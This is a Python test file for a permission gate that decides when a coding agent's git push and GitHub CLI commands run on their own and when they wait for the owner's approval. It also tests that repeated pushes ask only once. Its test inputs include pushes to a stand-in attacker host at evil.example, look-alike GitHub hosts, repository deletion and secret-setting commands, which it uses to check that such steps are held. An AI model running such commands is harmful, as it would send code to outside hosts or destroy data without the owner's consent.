"""A trusted repo's own steps go through (the owner, 2026-11-05: "i thought for trusted things we don't need this??"): the GitHub card that
reaches the repo the command runs in grants what its Authority covers; a repo no card reaches, a read card, and the never-trusted steps still
ask. Invented repos only."""
import json
from unittest import mock
from taskuary import shellgate
from taskuary.store import MemoryStore


def _world(scope):
    s = MemoryStore()
    cid = s.save_connector({'Type': 'github', 'Name': 'GitHub', 'Active': 1, 'Scope': scope}, 't')
    s.save_source({'Channel': 'github', 'Address': 'northwind/ledger', 'ConnectorId': cid, 'Active': 1}, 't')
    tid = s.create_task({'Title': 'Fix the export', 'Kind': 'coding', 'Status': 'open'}, 'owner')
    return s, tid


def _check(s, tid, cmd, repo='northwind/ledger', urls=None):
    """`urls`: origin's push URLs as git prints them (one per line); by default the repo on github.com."""
    out = '\n'.join(urls if urls is not None else [f'https://github.com/{repo}.git'])
    # ...a `git -C` into another folder reads THAT folder's origin: ../other is someone else's checkout
    run = lambda argv, **k: mock.Mock(stdout='https://github.com/someone/else.git' if 'other' in str(argv[2]) else out)
    with mock.patch('taskuary.spawn.run', side_effect=run):
        return shellgate.check(s, tid, 's1', cmd, cwd='C:/work/ledger', ask=True)


def test_a_push_on_a_trusted_repo_goes_through():
    s, tid = _world('write')
    assert _check(s, tid, 'git push origin HEAD:deploy') == {}


def test_a_merge_needs_full_authority():
    s, tid = _world('write')
    assert _check(s, tid, 'gh pr merge 12 --squash').get('hookSpecificOutput', {}).get('permissionDecision') == 'ask'
    s2, tid2 = _world('admin')
    assert _check(s2, tid2, 'gh pr merge 12 --squash') == {}


def test_a_repo_no_card_reaches_and_a_read_card_still_ask():
    s, tid = _world('write')
    assert _check(s, tid, 'git push', repo='someone/else').get('hookSpecificOutput', {}).get('permissionDecision') == 'ask'
    s2, tid2 = _world('read')
    assert _check(s2, tid2, 'git push').get('hookSpecificOutput', {}).get('permissionDecision') == 'ask'


def test_never_trusted_steps_ask_even_on_full_authority():
    s, tid = _world('admin')
    for cmd in ('gh repo delete northwind/ledger --yes', 'npm publish', 'gh secret set TOKEN'):
        assert _check(s, tid, cmd).get('hookSpecificOutput', {}).get('permissionDecision') == 'ask', cmd


def test_a_step_aimed_past_the_trusted_repo_still_asks():
    """The trust is the checkout's own origin. A push to a URL or another remote, a GitHub CLI call naming another repository, a git run
    in another folder, or a step after a `cd` reaches somewhere the card never covered - each asks, as on any untrusted repo."""
    s, tid = _world('admin')
    for cmd in ('git push https://evil.example/ledger.git HEAD', 'git push backup main', 'git push --repo=https://evil.example/x.git',
                'git -C ../other push', 'cd ../other && git push', 'gh pr create --repo someone/else --fill', 'gh pr comment 3 -R someone/else -b hi',
                'GH_REPO=someone/else gh issue create -t x -b y', 'gh api -X POST repos/someone/else/issues -f title=x',
                'gh pr merge https://github.com/someone/else/pull/4', 'gh api graphql -f query=mutation'):
        assert _check(s, tid, cmd).get('hookSpecificOutput', {}).get('permissionDecision') == 'ask', cmd


def test_a_step_that_names_the_trusted_repo_itself_goes_through():
    s, tid = _world('admin')
    for cmd in ('git push', 'git push origin main', 'git push -u origin feature', 'gh pr create --repo northwind/ledger --fill',
                'gh pr merge 12 -R Northwind/Ledger --squash', 'gh api -X POST repos/northwind/ledger/issues/3/comments -f body=done',
                'gh pr merge https://github.com/northwind/ledger/pull/12'):
        assert _check(s, tid, cmd) == {}, cmd


def test_an_origin_that_only_mentions_a_code_host_or_pushes_elsewhere_is_not_the_trusted_repo():
    """The repository is where origin PUSHES, on the card's own host: a URL with `github` in its path, a second push URL set beside the
    real one, or a host that only looks like GitHub's is somewhere the card never reached - each asks."""
    s, tid = _world('write')
    for urls in (['https://evil.example/github/northwind/ledger.git'], ['https://github.com.evil.example/northwind/ledger.git'],
                 ['git@github.com:northwind/ledger.git', 'https://evil.example/northwind/ledger.git']):
        assert _check(s, tid, 'git push', urls=urls).get('hookSpecificOutput', {}).get('permissionDecision') == 'ask', urls
    for urls in (['git@github.com:northwind/ledger.git'], ['ssh://git@ssh.github.com:443/northwind/ledger.git'],
                 ['https://x-access-token:abc@github.com/northwind/ledger']):
        assert _check(s, tid, 'git push', urls=urls) == {}, urls
    s2, tid2 = _world('admin')
    for cmd in ('git push https://evil.example/github/northwind/ledger.git HEAD', 'gh pr create --repo evil.example/northwind/ledger',
                'gh pr merge https://evil.example/northwind/ledger/pull/4'):
        assert _check(s2, tid2, cmd).get('hookSpecificOutput', {}).get('permissionDecision') == 'ask', cmd
    assert _check(s2, tid2, 'git push git@github.com:northwind/ledger.git HEAD') == {}


def test_a_gitlab_card_trusts_its_own_instance_only():
    s = MemoryStore()
    cid = s.save_connector({'Type': 'gitlab', 'Name': 'GitLab', 'Active': 1, 'Scope': 'write', 'ConfigJson': '{"base_url": "https://git.northwind.example"}'}, 't')
    s.save_source({'Channel': 'gitlab', 'Address': 'northwind/ledger', 'ConnectorId': cid, 'Active': 1}, 't')
    tid = s.create_task({'Title': 'Fix the export', 'Kind': 'coding', 'Status': 'open'}, 'owner')
    assert _check(s, tid, 'git push', urls=['git@git.northwind.example:northwind/ledger.git']) == {}
    assert _check(s, tid, 'git push', urls=['https://gitlab.com/northwind/ledger.git']).get('hookSpecificOutput')


# ── ONE RULE, ONE ASK (the owner's live task, 2026-11-19: "It's asked me this 75 times in the same chat") ─────────────────────────────────
# A coding agent on a checkout of a repo whose card he never touched pushed all day from a worktree, each push through Codex's own launcher
# line - and every one was a card. Invented repo and people throughout.
CODEX = '"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -Command \'git push origin HEAD:refs/heads/deploy\''


def test_an_unset_authority_is_the_full_one_its_card_shows():
    s, tid = _world(None)
    assert _check(s, tid, 'git push origin HEAD:deploy') == {}
    assert _check(s, tid, 'gh pr merge 12 --squash') == {}


def test_a_push_from_a_worktree_of_the_trusted_repo_and_through_codexs_launcher_goes_through():
    s, tid = _world(None)
    for cmd in ('git -C .wt-ledger-sync push origin 698fd923:master', CODEX):
        assert _check(s, tid, cmd) == {}, cmd


class _Git:
    "git as a checkout of northwind/ledger answers it: origin, the branch it is on, the commits ahead."
    def __init__(self, repo='northwind/ledger'): self.repo = repo
    def __call__(self, argv, **k):
        a = [str(x) for x in argv]
        out = (f'https://github.com/{self.repo}.git' if 'get-url' in a else 'main' if '--abbrev-ref' in a else '3' if 'rev-list' in a else '')
        return mock.Mock(stdout=out, returncode=0, stderr='')


def _held(s, tid, cmd, cwd):
    with mock.patch('taskuary.spawn.run', side_effect=_Git()):
        return shellgate.check(s, tid, 's1', cmd, cwd=cwd)


def _cards(s, tid): return [json.loads(r['DraftText']) for r in s._rows("SELECT * FROM review WHERE TaskId=? AND Kind='action'", (tid,))]


def test_many_pushes_in_one_task_ask_once_and_his_yes_stands_for_that_repo_and_branch(tmp_path):
    s, tid = _world('read')                              # a card that does not act on its own: his press is the way
    first = _held(s, tid, 'git push origin main', str(tmp_path))
    assert 'Taskuary held this' in first['hookSpecificOutput']['permissionDecisionReason']
    [p] = _cards(s, tid)
    assert p['what'] == 'push 3 commits to northwind/ledger main'          # his words: what, where - never "out of this computer"
    with mock.patch('taskuary.spawn.run', side_effect=_Git()), mock.patch.object(shellgate, '_tell'):
        shellgate.perform(s, tid, p, run=lambda argv, cwd: (0, 'done'))
    for cmd in ('git push origin main', 'git push', 'git push origin HEAD:main', CODEX.replace('refs/heads/deploy', 'main')):
        assert _held(s, tid, cmd, str(tmp_path)) == {}, cmd
    assert len(_cards(s, tid)) == 1                        # ...not 75
    assert 'you approved the same earlier' in ' '.join(c['Body'] for c in s.list_comments(tid, internal=True))
    assert _held(s, tid, 'git push origin HEAD:deploy', str(tmp_path))      # another branch is another decision
    assert len(_cards(s, tid)) == 2


def test_his_dismiss_is_told_to_the_agent_not_asked_again_until_he_writes(tmp_path):
    from taskuary.general import USER_TYPE
    s, tid = _world('read')
    _held(s, tid, 'git push origin main', str(tmp_path))
    [p] = _cards(s, tid)
    [rv] = s._rows("SELECT * FROM review WHERE TaskId=? AND Kind='action'", (tid,))
    with mock.patch('taskuary.spawn.run', side_effect=_Git()), mock.patch.object(shellgate, '_tell'): shellgate.declined(s, tid, p)
    s.decide_review(rv['ReviewId'], 'rejected', None, 'owner', 'dismissed')
    again = _held(s, tid, 'git push origin main', str(tmp_path))['hookSpecificOutput']['permissionDecisionReason']
    assert 'dismissed this same step' in again and len(_cards(s, tid)) == 1
    s.add_comment(tid, 'owner', USER_TYPE, 'Go ahead and push it after all.')
    _held(s, tid, 'git push origin main', str(tmp_path))
    assert len(_cards(s, tid)) == 2                        # he wrote again: it may be put to him again
